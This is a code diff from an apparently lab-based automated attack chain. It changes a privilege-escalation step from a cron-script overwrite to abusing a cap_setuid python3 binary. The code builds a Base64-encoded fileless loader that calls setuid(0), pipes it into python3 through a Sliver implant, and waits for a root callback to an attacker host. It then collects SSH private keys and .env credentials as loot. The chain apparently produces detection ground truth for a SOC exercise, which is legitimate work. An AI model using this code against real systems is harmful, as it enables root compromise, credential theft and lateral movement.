@@ -2,13 +2,20 @@
 
 Two sub-phases in one chain step:
 
-  A. Cron-overwrite privesc (T1053.003 + T1620 + T1036.005)
-     Build the same Base64 in-memory loader the initial exploit uses and
-     write it into ``/opt/cleanup.sh`` via the Sliver session implant. The
-     misconfigured cron entry (``/etc/cron.d/cleanup`` runs the script every
-     minute as root) fires the loader, which spawns a fresh fileless
-     ``[httpd]`` masqueraded process running as root and calls back to the
-     Sliver listener as a new session.
+  A. Capability-based privesc (T1548.001 + T1620 + T1036.005)
+     The lab seeds ``cap_setuid,cap_setgid+ep`` on ``/usr/bin/python3``
+     (see Infrastructure/apache/Dockerfile; the in-fiction story is that
+     Vinzenz set it so the booking CGI could chown user uploads, not
+     realising file capabilities are per-binary). Via the www-data Sliver
+     session, we invoke the capable python3 with a tiny prefix that calls
+     ``os.setuid(0); os.setgid(0)`` and then execs the same Base64
+     in-memory loader the initial exploit uses. The forked implant inherits
+     uid=0 through normal Unix semantics and calls back to the Sliver
+     listener as a new root session within ~3-5 seconds.
+
+     Distinct from basic-mode privesc (which still uses the
+     /opt/cleanup.sh cron tick, T1053.003) -- different ATT&CK technique,
+     different SOC signal, no file write to FIM-watched paths, no 60s wait.
 
   B. Credential harvest as root (T1552.001 + T1552.004)
      Once the root session is live, the previously perm-denied files in
@@ -22,13 +29,14 @@ step, :mod:`advanced_webserver_persistence`, so the SOC ground truth gives
 that tactic its own narrow start/end window.
 """
 # MITRE ATT&CK:
-#   T1053.003 – Scheduled Task/Job: Cron               (privesc vector)
+#   T1548.001 – Abuse Elevation Control: Setuid/Setgid (file capability)
 #   T1068     – Exploitation for Privilege Escalation
 #   T1620     – Reflective Code Loading                (in-memory root payload)
 #   T1036.005 – Masquerading: Match Legitimate Name    (`[httpd]` argv[0], now root)
 #   T1552.001 – Unsecured Credentials: Credentials In Files  (john's .env as root)
 #   T1552.004 – Unsecured Credentials: Private Keys    (john's id_ed25519 as root)
 
+import base64 as _b64
 import json
 import re
 import time
@@ -38,18 +46,19 @@ from chainlog import log
 from advanced_initial_access import (
     build_payload,
     sliver_exec,
-    sliver_upload,
     _list_sliver,
     _SESSION_HEADER_RE,
 )
 
-# How long to wait for the next cron tick after overwriting cleanup.sh.
-CRON_POLL_INTERVAL_SECS = 5
-CRON_POLL_MAX_SECS      = 80   # cron runs every minute; 80s covers >= 1 tick
+# Polling: capability-based privesc is near-instant (~3 s for sliver to
+# register the new root session); much shorter deadline than the cron variant.
+CAP_POLL_INTERVAL_SECS = 2
+CAP_POLL_MAX_SECS      = 20
 
-# Files to harvest as root once the cron has triggered. The .ssh/id_ed25519
-# is the primary credential consumed by PR-C lateral movement; .env is the
-# fallback password; the rest are intelligence for the SOC ground-truth.
+# Files to harvest as root once the new root session is live. The
+# .ssh/id_ed25519 is the primary credential consumed by PR-C lateral
+# movement; .env is the fallback password; the rest are intelligence
+# for the SOC ground-truth.
 HARVEST_PATHS = [
     "/home/john.stravidis/.ssh/id_ed25519",
     "/home/john.stravidis/.ssh/config",
@@ -62,32 +71,37 @@ HARVEST_PATHS = [
 LOOT_FILENAME = "webserver-loot.json"
 
 
-def _build_root_loader_script(kali_host: str, file_port: int = 8000) -> str:
-    """Compose the bash script that gets written into ``/opt/cleanup.sh``.
+def _build_elevated_python_loader(kali_host: str, file_port: int = 8000) -> str:
+    """Compose the Base64-encoded Python source that, when run by a
+    cap_setuid-capable python3, elevates to root and invokes the standard
+    in-memory implant loader.
 
-    The bash one-liner decodes the Base64 Python loader and pipes it into
-    ``python3``. The loader itself (from ``advanced_initial_access.build_payload``)
-    fetches the implant binaries from ``kali:8000`` and execve's them as
-    ``[httpd]`` via ``memfd_create``. When cron runs this as root, the new
-    implant inherits root.
+    The body is the same Base64 payload used by initial access (from
+    ``advanced_initial_access.build_payload``), prefixed with
+    ``os.setuid(0); os.setgid(0)``. python3's file capability promotes the
+    process to uid=0 *before* the memfd_create + fork + execve happens, so
+    the spawned ``[httpd]``-masqueraded implant inherits root through
+    normal Unix fork/exec semantics (no caps needed on the implant itself).
 
-    Output is suppressed so the cron daemon's MAILTO logic doesn't email a
-    flood of stdout each minute.
+    Returns a Base64 string ready to pipe through ``base64 -d | python3``.
     """
-    b64 = build_payload(kali_host, file_port)
-    return (
-        "#!/bin/bash\n"
-        "# /opt/cleanup.sh -- maintenance helper (overwritten by attacker).\n"
-        f"echo {b64} | base64 -d | python3 >/dev/null 2>&1\n"
+    inner_b64 = build_payload(kali_host, file_port)
+    elevated_src = (
+        "import os\n"
+        "os.setuid(0)\n"
+        "os.setgid(0)\n"
+        "import base64\n"
+        f"exec(base64.b64decode('{inner_b64}'))\n"
     )
+    return _b64.b64encode(elevated_src.encode()).decode()
 
 
 def _parse_root_session_id(sliver_output: str, exclude: set[str]) -> str | None:
     """Find the first session whose Username column == 'root' and isn't in ``exclude``.
 
     Sliver's session table has a row per active session; we need the one that
-    appeared *after* the cron tick, ergo not in the set we captured before
-    overwriting cleanup.sh.
+    appeared *after* we invoked the capable python3, ergo not in the set we
+    snapshotted just beforehand.
     """
     saw_header = False
     for line in sliver_output.splitlines():
@@ -134,38 +148,55 @@ def _capture_existing_session_ids() -> set[str]:
     return ids
 
 
-def subphase_cron_overwrite(sliver_session_id: str, cron_script: str,
-                            kali_host: str, scratch_dir: Path) -> str:
-    """Sub-phase A: write the loader into ``cron_script`` and wait for the root callback."""
-    log("\n=== Sub-phase A: cron overwrite + wait for root callback ===")
-    log(f"[*] Building Base64 in-memory loader (target callback: {kali_host}:8080)")
+def subphase_capability_privesc(sliver_session_id: str, cap_binary: str,
+                                kali_host: str, scratch_dir: Path) -> str:
+    """Sub-phase A: invoke the capable python3 to spawn a root Sliver session.
 
-    loader = _build_root_loader_script(kali_host)
-    local_loader = scratch_dir / "cleanup.sh"
-    local_loader.write_text(loader, encoding="utf-8")
-    log(f"[+] Local stager: {local_loader} ({len(loader)} bytes)")
+    Single-shot pipeline: ``echo <b64> | base64 -d | <cap_binary>``. The
+    capable python3 honours the file's cap_setuid+ep on exec, so the
+    embedded ``os.setuid(0)`` succeeds and the subsequent memfd_create +
+    fork + execve produces a uid=0 implant. No file is written to disk
+    on the target -- the loader source only ever lives in argv and the
+    shell pipe buffer.
+    """
+    log("\n=== Sub-phase A: cap_setuid python3 -> root callback ===")
+    log(f"[*] Using capable binary: {cap_binary} (expecting cap_setuid,cap_setgid+ep)")
+    log(f"[*] Building elevated in-memory loader (callback: {kali_host}:8080)")
+
+    elevated_b64 = _build_elevated_python_loader(kali_host)
+    log(f"[+] Elevated loader: {len(elevated_b64)} base64 bytes")
 
     before = _capture_existing_session_ids()
-    log(f"[*] Existing session(s) before cron tick: {sorted(before)}")
+    log(f"[*] Existing session(s) before invocation: {sorted(before)}")
 
-    log(f"[*] sliver: upload {local_loader} -> {cron_script}  (chmod 755)")
-    sliver_upload(sliver_session_id, str(local_loader), cron_script, chmod="755")
-    # Confirm the upload landed; useful when debugging cron-tick failures.
-    sliver_exec(sliver_session_id, f"execute -o ls -la {cron_script}")
-    log("[*] Cron will fire within 60 s -- polling for the new root session...")
+    # sliver's `execute` parser eats ANY token starting with `-` after the
+    # binary as if it were a sliver flag (silently!) -- so without `--` to
+    # separate sliver flags from target argv, the `-c "..."` and the
+    # setsid `-f` get dropped and /bin/sh runs with zero args. The `--`
+    # is mandatory. setsid -f then forks into a new session, severing
+    # the process group so the python3 (and its fork'd memfd implant)
+    # survive sliver's exec-complete cleanup.
+    cmd = (
+        f"execute -o -- setsid -f /bin/sh -c "
+        f"\"echo {elevated_b64} | base64 -d | {cap_binary} >/dev/null 2>&1\""
+    )
+    log(f"[*] sliver: {cmd[:90]}...")
+    sliver_exec(sliver_session_id, cmd)
 
-    deadline = time.time() + CRON_POLL_MAX_SECS
+    log(f"[*] Polling for the new root session (expected <{CAP_POLL_MAX_SECS}s)...")
+    deadline = time.time() + CAP_POLL_MAX_SECS
     while time.time() < deadline:
-        time.sleep(CRON_POLL_INTERVAL_SECS)
+        time.sleep(CAP_POLL_INTERVAL_SECS)
         out = _list_sliver("sessions")
         root_id = _parse_root_session_id(out, exclude=before)
         if root_id:
             log(f"[+] New root session captured: {root_id}")
             return root_id
-        log("[*] still waiting for cron tick...")
+        log("[*] still waiting for root session...")
     raise RuntimeError(
-        "advanced_webserver_privesc: cron tick produced no new root session "
-        f"within {CRON_POLL_MAX_SECS} s; check sliver-client > sessions manually"
+        "advanced_webserver_privesc: capable python3 produced no root session "
+        f"within {CAP_POLL_MAX_SECS} s; verify cap_setuid+ep on {cap_binary} "
+        f"with `getcap {cap_binary}` from a manual sliver session"
     )
 
 
@@ -214,14 +245,15 @@ def subphase_harvest_creds(root_session_id: str, scratch_dir: Path) -> dict:
     }
 
 
-def run(sliver_session_id: str, cron_script: str,
+def run(sliver_session_id: str, cap_binary: str,
         kali_host: str = "10.10.0.2",
         results_dir: str = "/Attack-chain/results") -> dict:
     """Run the privesc + credential-harvest step.
 
     Args:
         sliver_session_id: ID of the www-data session implant (from PR-B exploit).
-        cron_script:       Writable root cron path discovered by the enum step.
+        cap_binary:        Path to a binary with cap_setuid+ep, discovered by
+                           the enum step (e.g. /usr/bin/python3 per the lab seed).
         kali_host:         IP the new root loader calls back to.
         results_dir:       Per-run dir to write ``webserver-loot.json`` into.
 
@@ -232,9 +264,9 @@ def run(sliver_session_id: str, cron_script: str,
     scratch_dir = Path(results_dir) / "webserver-loot"
     scratch_dir.mkdir(parents=True, exist_ok=True)
 
-    log(f"\n[*] Starting advanced webserver privesc -> root via {cron_script}")
-    root_id = subphase_cron_overwrite(
-        sliver_session_id, cron_script, kali_host, scratch_dir,
+    log(f"\n[*] Starting advanced webserver privesc -> root via {cap_binary}")
+    root_id = subphase_capability_privesc(
+        sliver_session_id, cap_binary, kali_host, scratch_dir,
     )
 
     loot = subphase_harvest_creds(root_id, scratch_dir)
